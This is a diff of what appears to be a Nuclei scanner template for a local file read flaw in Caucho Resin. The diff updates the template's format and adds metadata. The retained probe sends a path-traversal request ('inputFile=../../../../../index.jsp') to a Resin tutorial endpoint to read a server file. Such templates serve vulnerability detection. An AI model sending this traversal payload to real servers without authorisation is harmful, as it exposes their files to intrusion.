@@ -1,4 +1,5 @@
 id: resin-inputfile-fileread
+
 info:
   name: Caucho Resin LFR
   author: princechaddha
@@ -7,7 +8,10 @@ info:
   reference:
     - https://blkstone.github.io/2017/10/30/resin-attack-vectors/
   tags: resin,caucho,lfr
-requests:
+  metadata:
+    max-request: 1
+
+http:
   - method: GET
     path:
       - "{{BaseURL}}/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=../../../../../index.jsp"
